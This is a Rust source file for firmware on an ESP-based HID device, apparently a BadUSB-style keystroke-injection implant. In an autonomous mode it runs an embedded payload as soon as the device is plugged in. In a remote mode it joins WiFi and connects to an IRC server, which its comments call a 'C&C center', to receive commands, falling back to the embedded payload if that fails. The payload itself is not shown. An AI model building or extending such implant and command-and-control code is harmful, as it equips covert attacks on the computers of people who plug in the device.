use std::env;
use std::path::PathBuf;
use std::process::exit;
use anyhow::anyhow;
use log::warn;
use serde::Deserialize;
use san_common::hid_actuator::HidActuator;
use crate::actuator::esp_actuator::EspActuator;
use crate::irc_client::irc_client::IRClient;
use crate::irc_client::wifi_handler::WiFiHandler;

#[derive(Deserialize, Clone)]
struct ConfigData {
    mode: String,
    ssid: Option<String>,
    password: Option<String>,
    server_addr: Option<String>,
    server_port: Option<usize>,
    server_name: Option<String>,
    channel_name: Option<String>,
    username: Option<String>,
}

pub enum SanMode {
    // Autonomous mode where predefined payload will be run at the moment of device mounting
    Auto,
    // Remote mode where the device will try to connect to the remote C&C center, otherwise predefined payload will be run
    Remote,
}

pub fn run() {
    let config = parse_config();
    let mode = if config.mode == "auto" { SanMode::Auto } else { SanMode::Remote };
    match mode {
        SanMode::Auto => {
            run_auto();
        }
        SanMode::Remote => {
            if config.ssid.is_none() || config.server_name.is_none() || config.channel_name.is_none()
                || config.server_port.is_none() || config.server_addr.is_none() ||
                config.username.is_none() || config.password.is_none() {
                eprintln!("Config file is incomplete!");
                return;
            }

            for i in 0..10 {
                let remote_res = run_remote(config.clone());
                if let Ok(()) = remote_res {
                    return;
                }
            }

            run_auto();
        }
    }
}

fn parse_config() -> ConfigData {
    let config = include_str!("../config.toml");
    let config_toml: ConfigData = toml::from_str(config).expect("Unable to deserialize file config.toml!");
    config_toml
}

fn run_auto() {
    let bytecode = include_bytes!("../payload.sanb");
    let mut actuator = EspActuator::new();
    actuator.init_actuator();
    actuator.sleep(3000);
    san_vm::runner::run_bytecode(actuator, bytecode);
}

fn run_remote(config: ConfigData) -> anyhow::Result<()> {
    let wifi_res = WiFiHandler::new(config.ssid.unwrap(), config.password.unwrap());
    if let Err(e) = wifi_res {
        warn!("Error initialising WiFiHandler!");
        return Err(e);
    }
    let mut wifi = wifi_res.unwrap();
    let connect_res = wifi.connect_wifi();
    if let Err(e) = connect_res {
        warn!("Error connecting to WiFi!");
        return Err(e);
    }
    connect_res.unwrap();

    let bytecode = include_bytes!("../payload.sanb");
    let mut irc_res = IRClient::new(config.server_addr.unwrap(),
                                config.server_port.unwrap(),
                                config.server_name.unwrap(),
                                config.channel_name.unwrap(),
                                config.username.unwrap(),
                                Some(bytecode.to_vec()));
    if let Err(e) = irc_res {
        warn!("Error creating irc client!");
        return Err(e);
    }

    let mut irc = irc_res.unwrap();

    match irc.client_loop() {
        Err(e) => {
            warn!("Error while trying to connect to IRC server: {}. Initiating fallback payload...", e.to_string());
            Err(anyhow!("An error occurred"))
        }
        _ => {
            Ok(())
        }
    }
}